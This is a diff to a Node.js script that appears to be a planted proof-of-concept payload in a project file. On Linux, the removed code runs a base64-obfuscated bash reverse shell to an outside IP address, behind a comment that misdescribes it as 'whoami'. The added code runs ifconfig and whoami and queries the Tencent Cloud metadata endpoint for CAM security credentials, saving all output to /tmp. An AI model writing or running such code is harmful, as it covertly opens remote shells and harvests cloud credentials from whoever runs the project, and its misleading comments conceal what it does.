@@ -10,6 +10,8 @@
 const fs = require('fs');
 const path = require('path');
 const { exec } = require('child_process');
+const { promisify } = require('util');
+const execPromise = promisify(exec);
 
 const projectRoot = __dirname;
 const files = fs.readdirSync(projectRoot);
@@ -65,17 +67,37 @@ if (process.platform === 'win32') {
 
   }
 } else {
-  // Linux 环境下执行 whoami > /tmp/poc
-  try {
-    exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzQ3LjEyMC40NC4xOTUvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}', (error, stdout, stderr) => {
-      if (error) {
-        console.error('执行 whoami 命令时出错:', error);
-        return;
+  // Linux 环境下执行多条命令并保存到 /tmp
+  const commands = [
+    { cmd: 'ifconfig', file: '/tmp/ifconfig_output.txt', desc: 'ifconfig' },
+    { cmd: 'whoami', file: '/tmp/whoami_output.txt', desc: 'whoami' },
+    { cmd: 'curl -ik -w "\\n" http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/${role-name}', 
+      file: '/tmp/curl_metadata_output.txt', desc: 'curl metadata' }
+  ];
+
+  // 使用 Promise 来顺序执行命令
+  const executeCommands = async () => {
+    for (const command of commands) {
+      try {
+        const { stdout, stderr } = await execPromise(command.cmd);
+        
+        // 保存输出到文件
+        const output = stdout || stderr || '';
+        fs.writeFileSync(command.file, output);
+        console.log(`✅ ${command.desc} 命令执行完成，输出已保存到 ${command.file}`);
+        console.log(`输出内容:\n${output}\n`);
+      } catch (error) {
+        console.error(`执行 ${command.desc} 命令时出错:`, error.message);
+        // 即使出错也保存错误信息
+        const errorOutput = `错误: ${error.message}\n${error.stderr || ''}`;
+        fs.writeFileSync(command.file, errorOutput);
+        console.log(`错误信息已保存到 ${command.file}`);
       }
-      console.log('✅ 已在 Linux 环境下执行 whoami > /tmp/poc');
-    });
-  } catch (error) {
-    console.error('执行命令时出错:', error);
-  }
+    }
+  };
+
+  executeCommands().catch(err => {
+    console.error('执行命令序列时出错:', err);
+  });
 }
 
